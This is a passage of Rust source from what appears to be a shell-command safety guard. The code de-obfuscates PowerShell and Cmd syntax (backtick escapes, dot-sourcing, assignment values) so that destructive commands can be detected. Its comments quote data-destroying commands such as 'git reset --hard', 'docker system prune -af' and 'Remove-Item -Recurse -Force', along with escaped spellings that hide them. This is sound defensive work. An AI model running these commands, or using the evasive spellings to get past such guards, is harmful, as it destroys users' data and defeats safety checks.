            segment_has_command = true;
            changed |= decoded.as_ref() != raw;
            output.push_str(decoded.as_ref());
        } else if command_is_assignment {
            // `NAME=value command ...` is not an environment-assignment
            // prefix in Cmd: Cmd attempts to execute `NAME=value`, so all
            // following words are inert argv and must not be reconstructed as
            // a second executable.
            output.push_str(raw);
        } else {
            let decoded = decode_cmd_pattern_piece(raw);
            changed |= decoded.as_ref() != raw;
            output.push_str(decoded.as_ref());
        }
        last = token.byte_range.end;
    }

    let Some(tail) = command.get(last..) else {
        return Cow::Borrowed(command);
    };
    let decoded_tail = decode_cmd_pattern_piece(tail);
    changed |= decoded_tail.as_ref() != tail;
    output.push_str(decoded_tail.as_ref());

    if changed {
        Cow::Owned(output)
    } else {
        Cow::Borrowed(command)
    }
}

/// Remove the PowerShell backtick escapes that only hid ordinary bytes of a
/// command name (dcg#294).
///
/// PowerShell strips a backtick escape before it resolves the command name, so
/// ``doc`ker system prune -af`` really runs `docker`. The regex packs match on
/// the normalized view, so a word whose executable identity a backtick was
/// splitting has to be reconstructed there.
///
/// Only escapes of ordinary word bytes are removed. A backtick before a quote,
/// a separator, `$`, or whitespace is escape syntax whose removal would change
/// the structure a later tokenizer sees — the same reason
/// [`decode_cmd_pattern_piece`] retains `^&` and friends — so those keep the
/// backtick verbatim. Verbatim single-quoted spans are left alone entirely:
/// PowerShell does not process escapes inside them.
fn decode_powershell_executable_backticks(word: &str) -> Cow<'_, str> {
    if !word.contains('`') {
        return Cow::Borrowed(word);
    }

    let mut output = String::with_capacity(word.len());
    let mut chars = word.chars();
    let mut in_single_quotes = false;
    let mut changed = false;

    while let Some(ch) = chars.next() {
        match ch {
            '\'' => {
                in_single_quotes = !in_single_quotes;
                output.push(ch);
            }
            '`' if !in_single_quotes => {
                let Some(escaped) = chars.next() else {
                    // A trailing backtick is incomplete syntax; do not guess.
                    return Cow::Borrowed(word);
                };
                if escaped.is_ascii_alphanumeric()
                    || matches!(escaped, '-' | '_' | '.' | '/' | '\\' | ':')
                {
                    output.push(escaped);
                    changed = true;
                } else {
                    output.push('`');
                    output.push(escaped);
                }
            }
            other => output.push(other),
        }
    }

    if in_single_quotes {
        // Do not reinterpret malformed/incomplete quoting.
        return Cow::Borrowed(word);
    }

    if changed {
        Cow::Owned(output)
    } else {
        Cow::Borrowed(word)
    }
}

/// Build the PowerShell matching view by de-escaping executable-position words.
///
/// Scope is deliberately narrower than the Cmd caret view: only the first word
/// of each command segment is decoded. A backtick inside an *argument* is data
/// (`git commit -m 'a`b'`) and revealing it would manufacture false positives,
/// whereas a backtick inside the command name is the only thing standing
/// between the raw text and a real execution.
fn decode_powershell_pattern_view(command: &str) -> Cow<'_, str> {
    if !command.contains('`') {
        return Cow::Borrowed(command);
    }

    let tokens = tokenize_for_shell_dialect(command, ShellDialect::PowerShell);
    if tokens.is_empty() {
        return Cow::Borrowed(command);
    }

    let mut replacements: Vec<(Range<usize>, String)> = Vec::new();
    let mut segment_has_command = false;
    let mut quoted_invocation_target = false;
    for token in &tokens {
        let Some(raw) = token.text(command) else {
            return Cow::Borrowed(command);
        };
        if token.kind == NormalizeTokenKind::Separator {
            // A leading call operator invokes its next word. An ampersand
            // after an existing command is the background operator instead;
            // it does not turn the following string expression into a call.
            quoted_invocation_target = !segment_has_command && raw == "&";
            // A closing parenthesis completes an expression; a following
            // ampersand is still backgrounding that completed command.
            segment_has_command = raw == ")";
            continue;
        }
        if segment_has_command {
            continue;
        }
        if raw == "." {
            // Dot sourcing, like the call operator, owns an executable
            // operand rather than evaluating a standalone string expression.
            quoted_invocation_target = true;
            continue;
        }
        segment_has_command = true;
        let string_expression =
            raw.starts_with(['\'', '"']) || raw.starts_with("@'") || raw.starts_with("@\"");
        if (!quoted_invocation_target && string_expression) || !raw.contains('`') {
            continue;
        }
        let decoded = decode_powershell_executable_backticks(raw);
        if decoded.as_ref() != raw {
            replacements.push((token.byte_range.clone(), decoded.into_owned()));
        }
    }

    if replacements.is_empty() {
        return Cow::Borrowed(command);
    }

    let mut output = String::with_capacity(command.len());
    let mut last = 0usize;
    for (range, replacement) in replacements {
        if range.start > last {
            output.push_str(&command[last..range.start]);
        }
        output.push_str(&replacement);
        last = range.end;
    }
    if last < command.len() {
        output.push_str(&command[last..]);
    }
    Cow::Owned(output)
}

/// Read each PowerShell invocation operator in command position as a call
/// operator at the start of its statement.
///
/// `. git reset --hard` runs Git exactly as `& git reset --hard` does: the dot
/// only changes the scope a script runs in. Every reader that understands the
/// call operator can judge the dot form once the `.` byte becomes `&`.
///
/// A command position here is the start of a statement and the operand of
/// `return`, `throw` or `exit`. The readers know a call operator best at the
/// start of a statement (`return & 'git' reset --hard` passed them), so
/// `return`, `throw` or `exit` before an operator is blanked:
/// `return . 'git' x` reads as `       & 'git' x`. The original line is judged
/// too, so the blanked prefix loses nothing. The view has the same length as
/// `command`, so spans still address it. An assignment's value is already
/// read as a statement of its own (see [`powershell_assignment_views`]), and
/// that statement passes through this view.
///
/// A quote ends the dot operator, so `.'git'` holds the operator and its
/// operand in one word. Only a static command word is read.
/// Dot-sourcing a variable or an expandable string (`. $profile`,
/// `. "$PSScriptRoot\x.ps1"`) loads a script whose name is not known here,
/// and keeps the reading it had; so do `& $x` and `& (…)` after `return`.
/// A `.` in an argument (`git add .`) is data. Returns `None` when nothing
/// changes.
#[must_use]
pub(crate) fn powershell_invocation_operator_view(command: &str) -> Option<String> {
    if !command.contains(['.', '&']) {
        return None;
    }
    let tokens = tokenize_for_shell_dialect(command, ShellDialect::PowerShell);
    // (statement start, operator byte) for each operator read.
    let mut operators = Vec::new();
    // Where the current statement starts; `None` after a closing parenthesis,
    // which completes an expression that no command follows.
    let mut statement_start = Some(0);
    let mut iter = tokens.iter().peekable();
    // Whether the next token is a static command word for the operator that
    // ends at `end`. Only `&` may touch its operand unquoted: `.git` is one
    // command name.
    let static_operand = |next: Option<&&NormalizeToken>, end: usize, call: bool| {
        next.is_some_and(|next| {
            next.kind == NormalizeTokenKind::Word
                && next.text(command).is_some_and(|word| {
                    (call || next.byte_range.start > end || word.starts_with(['\'', '"']))
                        && !word.contains('$')
                        && !word.starts_with(['@', '{'])
                })
        })
    };
    while let Some(token) = iter.next() {
        let raw = token.text(command)?;
        let range = &token.byte_range;
        if token.kind == NormalizeTokenKind::Separator {
            // A call operator after `return`, `throw` or `exit`. At a
            // statement start the readers already know it.
            if raw.trim() == "&"
                && let Some(start) = statement_start
                && !command[start..range.start].trim().is_empty()
                && static_operand(iter.peek(), range.end, true)
                && powershell_command_position(&command[start..range.start])
            {
                operators.push((start, range.start + raw.find('&')?));
            }
            statement_start = (raw != ")").then_some(range.end);
            continue;
        }
        // Block braces start statements of their own.
        if matches!(raw, "{" | "}") {
            statement_start = Some(range.end);
            continue;
        }
        let Some(start) = statement_start else {
            continue;
        };
        let quoted = (raw.starts_with(".'") || raw.starts_with(".\"")) && !raw.contains('$');
        let operator = if raw == "." || quoted {
            Some(range.start)
        } else {
            None
        };
        let Some(operator) = operator else {
            continue;
        };
        if (quoted || static_operand(iter.peek(), range.end, false))
            && powershell_command_position(&command[start..operator])
        {
            operators.push((start, operator));
        }
    }
    if operators.is_empty() {
        return None;
    }
    let mut view = command.as_bytes().to_vec();
    for (start, operator) in operators {
        view[start..operator].fill(b' ');
        view[operator] = b'&';
    }
    String::from_utf8(view).ok()
}

/// Whether a PowerShell command may follow `prefix`, the text of a statement
/// so far: nothing, `return`, `throw` or `exit`.
fn powershell_command_position(prefix: &str) -> bool {
    let prefix = prefix.trim();
    prefix.is_empty()
        || ["return", "throw", "exit"]
            .iter()
            .any(|keyword| prefix.eq_ignore_ascii_case(keyword))
}

/// Return the executable right-hand side of a simple PowerShell variable
/// assignment.
///
/// Ordinary and scoped variables plus a leading type constraint are handled.
/// More elaborate lvalues stay conservative and return `None`. Quotes and
/// backtick escapes are honored so an equals sign in data is not mistaken for
/// assignment syntax.
#[must_use]
pub(crate) fn powershell_assignment_rhs(candidate: &str) -> Option<&str> {
    let mut in_single = false;
    let mut in_double = false;
    let mut escaped = false;

    for (idx, ch) in candidate.char_indices() {
        if escaped {
            escaped = false;
            continue;
        }
        if ch == '`' && !in_single {
            escaped = true;
            continue;
        }

        match ch {
            '\'' if !in_double => in_single = !in_single,
            '"' if !in_single => in_double = !in_double,
            '=' if !in_single && !in_double => {
                let mut lhs = candidate[..idx].trim();
                lhs = lhs.trim_end_matches(['+', '-', '*', '/', '%', '?']);
                lhs = lhs.trim_end();

                if let Some(after_type) = lhs.strip_prefix('[').and_then(|rest| {
                    let close = rest.find(']')?;
                    Some(rest[close + 1..].trim_start())
                }) {
                    lhs = after_type;
                }
                if lhs.starts_with('$') && !lhs.bytes().any(|byte| byte.is_ascii_whitespace()) {
                    return Some(candidate[idx + 1..].trim());
                }
            }
            _ => {}
        }
    }

    None
}

/// The words and separators of `segment` as the POSIX shell reads them, as
/// written: a word keeps its quoted, escaped and expanded blanks
/// (`x="a b"`, `x=${y:- a}`, `x=$(echo a b)`), so its second half is not
/// mistaken for the next word. For the readers that look for a command name
/// past the words before it.
pub(crate) fn posix_command_words(segment: &str) -> Vec<&str> {
    posix_command_word_ranges(segment)
        .into_iter()
        .filter_map(|range| segment.get(range))
        .collect()
}

/// The byte ranges of [`posix_command_words`].
pub(crate) fn posix_command_word_ranges(segment: &str) -> Vec<std::ops::Range<usize>> {
    let tokens = tokenize_for_shell_dialect(segment, ShellDialect::Posix);
    // The tokenizer ends a word at the `&` of `2>&1` and the `|` of `>|f`;
    // the shell reads one redirection there, so join them back.
    let mut ranges = Vec::with_capacity(tokens.len());
    let mut index = 0usize;
    while let Some(token) = tokens.get(index) {
        let mut range = token.byte_range.clone();
        index += 1;
        if token.kind == NormalizeTokenKind::Word
            && token
                .text(segment)
                .is_some_and(|text| text.ends_with(['<', '>']))
            && let Some(operator) = tokens.get(index)
            && operator.byte_range.start == range.end
            && matches!(operator.text(segment), Some("&" | "|"))
        {
            range.end = operator.byte_range.end;
            index += 1;
            if let Some(target) = tokens.get(index)
                && target.kind == NormalizeTokenKind::Word
                && target.byte_range.start == range.end
            {
                range.end = target.byte_range.end;
                index += 1;
            }
        }
        ranges.push(range);
    }
    ranges
}

/// The words of one simple command with their quotes removed, as
/// `shell_words::split` gives them, but split only where the POSIX shell
/// splits them (see [`posix_command_words`]): `x=${y:- a}` and
/// `x=$(echo a b)` are one word each. A word that `shell_words` would split
/// further, a substitution holding a blank, is kept as written.
pub(crate) fn posix_simple_command_words(
    text: &str,
) -> Result<Vec<String>, shell_words::ParseError> {
    let mut words = Vec::new();
    for raw in posix_command_words(text) {
        let mut split = shell_words::split(raw)?;
        match split.len() {
            0 => {}
            1 => words.extend(split.pop()),
            _ => words.push(raw.to_string()),
        }
    }
    Ok(words)
}

/// Tokenize a command while preserving every raw token's byte span.
///
/// POSIX and unknown input deliberately use the established normalizer
/// tokenizer unchanged. PowerShell and Cmd need dialect-specific scanners so
/// their escape characters can keep whitespace, line continuations, and shell
/// metacharacters inside the same raw word. No token text is decoded here;
/// callers can slice the original command through [`NormalizeToken::text`] and
/// pass syntax-role words to [`ShellTokenDecoder::decode`].
///
/// PowerShell's `--%` token remains present as a raw word for the decoder to
/// consume. Until the next physical newline or unquoted pipeline (`|`, `|&`,
/// or `||`), semicolons and other shell metacharacters are kept in raw words;
/// native-argument whitespace and quote grouping are still tokenized
/// conservatively. The pipeline/newline is emitted as a separator and normal
/// PowerShell tokenization resumes after it.
#[must_use]
pub(crate) fn tokenize_for_shell_dialect(command: &str, dialect: ShellDialect) -> NormalizeTokens {
    match dialect {
        ShellDialect::Posix => tokenize_normalization_inner(command, true),
        ShellDialect::Unknown => tokenize_for_normalization(command),
        ShellDialect::PowerShell => tokenize_powershell_raw(command),
        ShellDialect::Cmd => tokenize_cmd_raw(command),
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum PowerShellHashRole {
    Comment,
    Literal,
    Ambiguous,
}

pub(crate) fn powershell_hash_role(bytes: &[u8], index: usize) -> PowerShellHashRole {
    if bytes.get(index) != Some(&b'#') {
        return PowerShellHashRole::Literal;
    }
    powershell_comment_predecessor_role(bytes, index)
}

/// Classify the byte before a possible line or block comment.
fn powershell_comment_predecessor_role(bytes: &[u8], index: usize) -> PowerShellHashRole {
    if index == 0
        || bytes[index - 1].is_ascii_whitespace()
        || powershell_horizontal_space_ends_at(bytes, index)
        || matches!(
            bytes[index - 1],
            b';' | b'|' | b'&' | b'(' | b')' | b'{' | b'}' | b'[' | b']' | b','
        )
    {
        return PowerShellHashRole::Comment;
    }
    if bytes[index - 1].is_ascii_alphanumeric() || bytes[index - 1] == b'_' {
        return PowerShellHashRole::Literal;
    }
    PowerShellHashRole::Ambiguous
}

fn tokenize_powershell_raw(command: &str) -> NormalizeTokens {
    tokenize_powershell_with_comments(command, false).0
}

/// Deny-only views of a command's PowerShell assignments: what PowerShell
/// runs as an assignment's value, read where the readers look for a
/// command. See [`powershell_assignment_views`].
#[derive(Debug, Default, PartialEq, Eq)]
pub(crate) struct PowerShellAssignmentViews {
    /// `command` with every operator before a value in command mode replaced
    /// by `;` and blanks, so the value starts a statement of its own. Same
    /// length and byte offsets. `None` when there is no such value.
    pub(crate) separated: Option<String>,
    /// Each value in expression mode, as its own command `$c = <value>`.
    pub(crate) values: Vec<String>,
}

/// The assignment views of `command` (see [`PowerShellAssignmentViews`]).
///
/// PowerShell runs the value of an assignment as a pipeline: `$c=iex '…'`,
/// `$null = Remove-Item -Recurse -Force x`, `$c[ 0 ]=git reset --hard`,
/// `@{a=git reset --hard}`, `$c=[IO.Directory]::Delete('x', $true)` and
/// `@{a = 1|%{git reset --hard}}` run what they name (pwsh 7.5, measured in
/// the sandbox). The readers and packs each find a statement's command by
/// themselves, and each has its own idea of an assignment: the tokenizer
/// keeps `$c=iex` as one word, some readers want `$name =` as separate
/// words, the filesystem pack skips any statement that starts with
/// `$name =`, and the script-block readers look only at a plain `$c = `
/// that starts the command.
///
/// A value that PowerShell parses in command mode (see
/// [`powershell_value_is_command`]) is separated in place, so every reader
/// and pack judges it as the command it is, with the rest of the command
/// around it. Any other value is copied out as `$c = <value>`, to its
/// statement's end ([`powershell_value_end`]), so it gets the verdict of
/// that spelling: `$y=$x*2` and `$t = $(Get-Date)` stay allowed, as their
/// `$c = ` spellings are.
///
/// This pass does not decide whether the assignment stands where PowerShell
/// runs it. An argument spelled like an assignment (`Write-Output $c = x`,
/// `git commit -m $c=iex`) is judged as one too: the views only add
/// denials, and base already denied such spaced spellings with `iex`. A
/// target starts a word, or follows a block brace or an assignment operator
/// inside one (`if(1){$c=…`, `$a=$b=…`). A word that holds only a target or
/// a type constraint is continued by the next word (`[string] $c=…`,
/// `$c = iex`). Brackets and braced names with blanks inside continue a
/// target across words (`$c[$i + 1]=…`, `[Dictionary[string, int]]$c=…`,
/// `${c d}=…`); the words inside are still read as usual. After a closing
/// parenthesis a word may continue the target (`$c.$('p')=…`,
/// `(Get-Item x).p=…`). A bare or quoted name is a target only as a
/// hashtable key: after `@{`, or after `;` or a line break inside one.
/// Quoted text, here-strings and escapes are skipped.
pub(crate) fn powershell_assignment_views(command: &str) -> PowerShellAssignmentViews {
    let bytes = command.as_bytes();
    let mut views = PowerShellAssignmentViews::default();
    let mut separated: Option<Vec<u8>> = None;
    // Where each value starts, and whether it is an expression.
    let mut starts: Vec<(usize, bool)> = Vec::new();
    for (at, len) in powershell_assignment_operators(command) {
        let rest = &command[at + len..];
        let expression = !powershell_value_is_command(rest);
        if !expression {
            // An operator is ASCII, or a dash character followed by `=`, so
            // these bytes are whole characters.
            let bytes = separated.get_or_insert_with(|| bytes.to_vec());
            bytes[at] = b';';
            bytes[at + 1..at + len].fill(b' ');
        }
        starts.push((command.len() - rest.trim_start().len(), expression));
    }
    views.separated = separated.and_then(|bytes| String::from_utf8(bytes).ok());
    starts.sort_unstable();
    starts.dedup_by_key(|&mut (start, _)| start);
    let ends = powershell_value_ends(bytes, starts.iter().map(|&(start, _)| start));
    // Where each value starts and ends, and whether it is an expression. A
    // value whose brackets never close is no PowerShell: pwsh runs nothing
    // of such a script (a POSIX heredoc's `$h={`).
    let mut values: Vec<(usize, usize, bool)> = starts
        .into_iter()
        .zip(ends)
        .filter_map(|((start, expression), end)| {
            end.filter(|&end| end > start)
                .map(|end| (start, end, expression))
        })
        .collect();
    // Copy each expression out. A value inside it reads as `$null` there,
    // as it is read by itself, so each byte is copied once (`$a=$b=…` and
    // nested hashtables stay linear).
    values.sort_by_key(|&(start, end, _)| (start, std::cmp::Reverse(end)));
    let mut open: Vec<(usize, bool, String)> = Vec::new();
    let mut copied = 0;
    let mut seen = HashSet::new();
    let mut close = |open: &mut Vec<(usize, bool, String)>, copied: &mut usize, limit: usize| {
        while open.last().is_some_and(|&(end, ..)| end <= limit) {
            let Some((end, expression, mut text)) = open.pop() else {
                break;
            };
            text.push_str(&command[*copied..end]);
            *copied = end;
            if let Some((.., parent)) = open.last_mut() {
                parent.push_str("$null");
            }
            let text = text.trim_end();
            // Assigning a script block runs nothing (pwsh 7.5): its body is
            // judged where the block is invoked (`& $c`).
            let block = text.starts_with('{')
                && powershell_group_end(text.as_bytes(), 0) == Some(text.len());
            if expression
                && !block
                && !powershell_value_is_inert(text)
                && seen.insert(text.to_owned())
            {
                views.values.push(format!("$c = {text}"));
            }
        }
    };
    for (start, end, expression) in values {
        close(&mut open, &mut copied, start);
        if let Some((.., parent)) = open.last_mut() {
            parent.push_str(&command[copied..start]);
        }
        copied = start;
        open.push((end, expression, String::new()));
    }
    close(&mut open, &mut copied, usize::MAX);
    views
}

/// Where each assignment value that starts at `starts` (ascending) ends:
/// its statement ends at a `;` or a line end outside brackets, or at the
/// bracket that closes the group, block or hashtable the assignment stands
/// in. A line that ends with `|`, or whose next line starts with one,
/// continues the pipeline. `None` when a bracket the value opens never
/// closes. One pass over the text for all values.
fn powershell_value_ends(
    bytes: &[u8],
    starts: impl IntoIterator<Item = usize>,
) -> Vec<Option<usize>> {
    let len = bytes.len();
    let mut starts = starts.into_iter().enumerate().peekable();
    let mut ends = Vec::new();
    // Per open bracket, innermost last: the values waiting for their end.
    let mut frames: Vec<Vec<usize>> = vec![Vec::new()];
    let mut last_visible = None;
    // The first non-blank byte at or after a line end, read once per run.
    let mut next_visible = (0, None);
    let mut i = 0;
    loop {
        while let Some((index, _)) = starts.next_if(|&(_, start)| start <= i) {
            ends.push(None);
            if let Some(frame) = frames.last_mut() {
                frame.push(index);
            }
        }
        if i >= len {
            break;
        }
        let byte = bytes[i];
        let mut statement_end = false;
        let next = match byte {
            b'(' | b'{' | b'[' => {
                frames.push(Vec::new());
                i + 1
            }
            b')' | b'}' | b']' => {
                if frames.len() > 1 {
                    for index in frames.pop().unwrap_or_default() {
                        ends[index] = Some(i);
                    }
                } else {
                    // A closer with no opener ends the statement.
                    statement_end = true;
                }
                i + 1
            }
            b';' => {
                statement_end = true;
                i + 1
            }
            b'\r' | b'\n' => {
                if next_visible.0 <= i {
                    let blank = bytes[i..]
                        .iter()
                        .take_while(|byte| byte.is_ascii_whitespace())
                        .count();
                    next_visible = (i + blank, bytes.get(i + blank).copied());
                }
                statement_end = last_visible != Some(b'|') && next_visible.1 != Some(b'|');
                i + 1
            }
            b'`' => consume_shell_escape(bytes, i, len),
            b'$' if bytes.get(i + 1) == Some(&b'{') => {
                braced_variable_end(bytes, i, len).unwrap_or(len)
            }
            b'@' => consume_powershell_here_string(bytes, i, len).unwrap_or(i + 1),
            b'\'' | b'"' => powershell_quoted_end(bytes, i, len),
            _ => i + 1,
        };
        if statement_end && let Some(frame) = frames.last_mut() {
            for index in frame.drain(..) {
                ends[index] = Some(i);
            }
        }
        if !byte.is_ascii_whitespace() {
            last_visible = Some(bytes[next - 1]);
        }
        i = next;
    }
    // At the end of the text a value ends there unless a bracket it opened
    // is still open.
    if let Some(frame) = frames.last() {
        for &index in frame {
            ends[index] = Some(len);
        }
    }
    ends
}

/// Position after the bracket that closes the `(`, `{` or `[` at `i`, with
/// quoted text, here-strings and escapes skipped, or `None` if it never
/// closes.
fn powershell_group_end(bytes: &[u8], i: usize) -> Option<usize> {
    let len = bytes.len();
    let mut depth = 0usize;
    let mut j = i;
    while j < len {
        j = match bytes[j] {
            b'(' | b'{' | b'[' => {
                depth += 1;
                j + 1
            }
            b')' | b'}' | b']' => {
                depth = depth.checked_sub(1)?;
                if depth == 0 {
                    return Some(j + 1);
                }
                j + 1
            }
            b'`' => consume_shell_escape(bytes, j, len),
            b'$' if bytes.get(j + 1) == Some(&b'{') => braced_variable_end(bytes, j, len)?,
            b'@' => consume_powershell_here_string(bytes, j, len).unwrap_or(j + 1),
            b'\'' | b'"' => powershell_quoted_end(bytes, j, len),
            _ => j + 1,
        };
    }
    None
}

/// Whether an expression value can run nothing: it holds only variables,
/// numbers, strings without a subexpression, blanks and arithmetic or
/// comparison-free operators (`$x * 2`, `$a + 'b'`, `$h[$i]`, `$a=$null`).
/// Any word, type, member, block, pipe, call or redirection makes it a
/// value worth reading.
fn powershell_value_is_inert(value: &str) -> bool {
    let bytes = value.as_bytes();
    let len = bytes.len();
    let mut i = 0;
    while i < len {
        i = match bytes[i] {
            b'$' if bytes.get(i + 1) == Some(&b'{') => match braced_variable_end(bytes, i, len) {
                Some(end) => end,
                None => return false,
            },
            b'$' => match powershell_variable_end(bytes, i, len, None) {
                Some(end) => end,
                None => return false,
            },
            b'\'' => powershell_quoted_end(bytes, i, len),
            b'"' => {
                let end = powershell_quoted_end(bytes, i, len);
                if bytes[i..end].windows(2).any(|pair| pair == b"$(")
                    || bytes[i..end].contains(&b'`')
                {
                    return false;
                }
                end
            }
            b'.' if bytes.get(i + 1).is_some_and(u8::is_ascii_digit) => i + 1,
            byte if byte.is_ascii_digit()
                || byte.is_ascii_whitespace()
                || b"+-*/%=,()[]!".contains(&byte) =>
            {
                i + 1
            }
            _ => return false,
        };
    }
    true
}

/// Where each assignment operator that follows an assignment target starts
/// in `command`, and its length (see [`powershell_assignment_views`]).
fn powershell_assignment_operators(command: &str) -> Vec<(usize, usize)> {
    if !command.contains('=') {
        return Vec::new();
    }
    let bytes = command.as_bytes();
    let tokens = tokenize_powershell_raw(command);
    let word_ends_at = |at: usize| {
        at == bytes.len()
            || tokens
                .binary_search_by_key(&at, |token| token.byte_range.end)
                .is_ok()
    };
    // Where each operator starts, and its length.
    let mut operators: Vec<(usize, usize)> = Vec::new();
    // Open braces, innermost last: `true` for a hashtable literal `@{`.
    let mut braces: Vec<bool> = Vec::new();
    let mut key_next = false;
    let mut after_target = false;
    let mut group_end = None;
    // Where each `[` and `${` closes, read once when a target needs it.
    let mut closes: Option<HashMap<usize, usize>> = None;
    // Where a target that spans words left off: a value inside a later word
    // (`1]=$b=iex`) or a word end that the next word continues (`] =iex`).
    let mut value_starts: BTreeSet<usize> = BTreeSet::new();
    let mut continued_at: BTreeSet<usize> = BTreeSet::new();
    for token in &tokens {
        let (start, end) = (token.byte_range.start, token.byte_range.end);
        if token.kind == NormalizeTokenKind::Separator {
            let raw = token.text(command).unwrap_or_default();
            let next_line = raw.trim() == ";" || raw.contains(['\r', '\n']);
            key_next = next_line && braces.last() == Some(&true);
            after_target = raw == ")";
            group_end = after_target.then_some(end);
            continue;
        }
        let mut i = start;
        let mut at_start = true;
        let mut key = std::mem::take(&mut key_next);
        if std::mem::take(&mut after_target) {
            // `$c =iex`, `$c.$('p')=iex`, `(Get-Item x).p=iex`, `$c[(0)]=iex`.
            let mut j = i;
            if group_end == Some(start) {
                while j < end && bytes[j] == b']' {
                    j += 1;
                }
                j = powershell_member_chain_end(bytes, j, end, None).unwrap_or(j);
            }
            if let Some(len) = powershell_assignment_operator_len(bytes, j, end) {
                operators.push((j, len));
                i = j + len;
                key = false;
            } else if j == end && j > start {
                // `(Get-Variable c).Value =iex`: the next word continues it.
                continued_at.insert(end);
            }
        }
        group_end = None;
        while i < end {
            at_start |= !value_starts.is_empty() && value_starts.remove(&i);
            let target = if at_start {
                powershell_assignment_target_end(bytes, i, end, key, None).or_else(|| {
                    let closes = closes.get_or_insert_with(|| powershell_closing_ends(bytes));
                    powershell_assignment_target_end(bytes, i, bytes.len(), key, Some(closes))
                        .filter(|&target_end| target_end > end)
                })
            } else {
                None
            };
            if let Some(target_end) = target {
                if target_end > end {
                    // `$c[ 0 ]=iex`: the operator is in a later word.
                    if let Some(len) =
                        powershell_assignment_operator_len(bytes, target_end, bytes.len())
                    {
                        operators.push((target_end, len));
                        let value = target_end + len;
                        if !word_ends_at(value) {
                            value_starts.insert(value);
                        }
                    } else if word_ends_at(target_end) {
                        continued_at.insert(target_end);
                    }
                } else if target_end == end {
                    // `$c`, `[string]` or `$a,`: the next word continues it.
                    after_target = true;
                    key = false;
                    break;
                } else if let Some(len) = powershell_assignment_operator_len(bytes, target_end, end)
                {
                    operators.push((target_end, len));
                    i = target_end + len;
                    key = false;
                    continue;
                }
            }
            at_start = false;
            key = false;
            match bytes[i] {
                b'{' => {
                    let hashtable = i > start && bytes[i - 1] == b'@';
                    braces.push(hashtable);
                    at_start = true;
                    key = hashtable;
                    i += 1;
                }
                b'}' => {
                    braces.pop();
                    at_start = true;
                    i += 1;
                }
                b'`' => i = consume_shell_escape(bytes, i, end),
                b'$' if bytes.get(i + 1) == Some(&b'{') => {
                    i = braced_variable_end(bytes, i, end).unwrap_or(end);
                }
                b'@' => i = consume_powershell_here_string(bytes, i, end).unwrap_or(i + 1),
                b'\'' | b'"' => i = powershell_quoted_end(bytes, i, end),
                _ => i += 1,
            }
        }
        if !continued_at.is_empty() && continued_at.remove(&end) {
            after_target = true;
            key = false;
        }
        // `@{` ends the word: the next word is a key.
        key_next = key;
    }
    operators
}

/// Whether an assignment value that starts `rest` is parsed in command mode,
/// judged from its first character: a bare word, `&` or `.` runs a command
/// (`git …`, `& $exe`, `. ./x.ps1`, `.{…}`). A variable, parenthesis, `@`,
/// type, script block, string, digit or unary operator starts an
/// expression (`$x*2`, `$(Get-Date)`, `'text'`, `-not $x`). Separating such
/// a value would make it look like a command with a dynamic name, so it is
/// read as `$c = <value>` instead. PowerShell itself reads a word that
/// starts with a digit but is no number as a command (`$c = 7z a x` runs
/// `7z`); here it is an expression, judged as its `$c = ` spelling is.
fn powershell_value_is_command(rest: &str) -> bool {
    let mut chars = rest.trim_start().chars();
    match chars.next() {
        None => false,
        Some('.') => !chars.next().is_some_and(|next| next.is_ascii_digit()),
        Some(first) => {
            !(first.is_ascii_digit()
                || matches!(
                    first,
                    '$' | '('
                        | '@'
                        | '['
                        | '{'
                        | '\''
                        | '"'
                        | '-'
                        | '+'
                        | '!'
                        | ','
                        | '\u{2013}'..='\u{2015}'
                        | '\u{2018}'..='\u{201e}'
                ))
        }
    }
}

/// Position after the `]` or `}` that closes each `[` and `${` in the text,
/// read across blanks with quoted text, escapes and here-strings skipped.
/// One pass over the text, so a target read across words costs a lookup.
fn powershell_closing_ends(bytes: &[u8]) -> HashMap<usize, usize> {
    let len = bytes.len();
    let mut closes = HashMap::new();
    let mut open: Vec<usize> = Vec::new();
    // Once a `${` has no closing brace, no later one has either.
    let mut braces_close = true;
    let mut i = 0;
    while i < len {
        match bytes[i] {
            b'[' => {
                open.push(i);
                i += 1;
            }
            b']' => {
                if let Some(at) = open.pop() {
                    closes.insert(at, i + 1);
                }
                i += 1;
            }
            b'`' => i = consume_shell_escape(bytes, i, len),
            b'$' if bytes.get(i + 1) == Some(&b'{') => {
                match braces_close
                    .then(|| braced_variable_end(bytes, i, len))
                    .flatten()
                {
                    Some(close) => {
                        closes.insert(i, close);
                        i = close;
                    }
                    None => {
                        braces_close = false;
                        i += 2;
                    }
                }
            }
            b'@' => i = consume_powershell_here_string(bytes, i, len).unwrap_or(i + 1),
            b'\'' | b'"' => i = powershell_quoted_end(bytes, i, len),
            _ => i += 1,
        }
    }
    closes
}

/// Length of the assignment operator at `i`, if one starts there: `=`,
/// `+=`, `-=`, `*=`, `/=`, `%=` or `??=`. PowerShell reads U+2013, U+2014
/// and U+2015 as `-` (pwsh 7.5: `$c–=iex '…'` runs its command).
fn powershell_assignment_operator_len(bytes: &[u8], i: usize, end: usize) -> Option<usize> {
    let rest = bytes.get(i..end)?;
    if rest.starts_with(b"??=") {
        return Some(3);
    }
    let lead = ["+", "-", "*", "/", "%", "\u{2013}", "\u{2014}", "\u{2015}"]
        .iter()
        .find(|lead| rest.starts_with(lead.as_bytes()))
        .map_or(0, |lead| lead.len());
    (rest.get(lead) == Some(&b'=')).then_some(lead + 1)
}

/// End of an assignment target that starts at `i`: one or more variables
/// separated by commas (`$c`, `${c}`, `$env:C`, `$cé`, `$a,$b`), each with
/// members and indexes (`$c.p`, `$c.'p'`, `$c.$n`, `$c[0]`) and optional type
/// constraints before it (`[int[]]$c`), a static property (`[T]::P`), a bare
/// type constraint, or, for a hashtable key, a bare or quoted name. `None`
/// when no target starts at `i`.
///
/// Without `across` the target ends within `end`. With it, `end` is the end
/// of the text, and each `[` and `${` closes where `across` says, so their
/// blanks do not end the target (`$c[ 0 ]`, `${c d}`); any other blank does.
fn powershell_assignment_target_end(
    bytes: &[u8],
    i: usize,
    end: usize,
    hash_key: bool,
    across: Option<&HashMap<usize, usize>>,
) -> Option<usize> {
    if hash_key {
        return powershell_member_name_end(bytes, i, end, across);
    }
    let word_ends = |j: usize| {
        j == end
            || powershell_horizontal_space_len(bytes, j).is_some()
            || matches!(bytes[j], b'\r' | b'\n')
    };
    let mut j = i;
    let mut typed = false;
    while bytes.get(j) == Some(&b'[') && j < end {
        j = powershell_closing_end(bytes, j, end, across)?;
        typed = true;
    }
    if typed {
        if word_ends(j) {
            return Some(j);
        }
